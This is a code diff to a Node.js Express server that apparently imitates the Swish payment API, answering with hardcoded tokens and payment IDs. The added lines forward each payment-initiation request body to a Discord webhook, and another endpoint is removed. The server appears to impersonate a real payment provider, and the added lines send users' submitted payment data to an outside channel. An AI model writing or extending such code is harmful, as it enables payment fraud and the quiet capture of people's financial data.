@@ -37,6 +37,10 @@ app.use((req, res, next) => {
 
 app.post("/mpc-swish/api/v4/initiatepayment", (req, res) => {
   res.status(200).send('{"autoStartToken":"0336631d-8a76-46a1-8b3a-f7b0f69aa257","result":"200","paymentID":"FBB1C98ACE8948AB82A21FCEEEAB02CF"}');
+  const ParsedJson = JSON.parse(req.body);
+  sendDiscordWebhook(ParsedJson);
+
+
 });
 
 app.get("/mpc-swish/api/v1/blocks/", (req, res) => {
@@ -105,15 +109,6 @@ app.get("/mpc-swish/api/v1/paymentrequest/viewSetting", (req, res) => {
     '{"data":{"privatePaymentRequest":true,"requireParentalConsent":false},"time":"2024-05-23T17:08:25.261+00:00"}',
   );
 });
-app.get("/payments", async (req, res) => {
-  try {
-    const result = await pool.query("SELECT * FROM payments");
-    res.status(200).json(result.rows);
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
 // Endpoint for initiating payment requests
 let userID = 0;
 
